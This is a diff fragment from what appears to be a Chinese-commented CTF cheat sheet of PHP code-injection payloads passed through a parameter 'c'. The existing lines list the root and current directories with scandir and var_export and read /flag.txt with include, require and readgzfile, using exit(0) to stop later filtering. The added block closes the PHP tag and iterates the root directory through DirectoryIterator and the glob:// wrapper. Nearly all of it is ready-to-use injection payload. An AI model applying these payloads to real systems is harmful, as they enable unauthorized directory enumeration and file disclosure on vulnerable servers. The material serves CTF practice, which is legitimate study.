@@ -102,6 +102,12 @@ c=print_r(scandir(".")); //打印当前目录
 c=var_dump(scandir("."));//打印当前目录
 c=var_export(scandir("."));//打印当前目录
 c=var_export(scandir("/"));exit(0);//exit(0)用于让后续的替换无法执行
+c=?><?php
+$a=new DirectoryIterator("glob:///*");
+foreach($a as $f)
+{echo($f->__toString().' ');
+} exit(0);
+?> //高级用法，利用glob://协议来获取/*目录下的内容
 c=include("/flag.txt"); //输出文件
 c=require("/flag.txt"); //输出文件
 c=readgzfile("/flag.txt");//输出文件
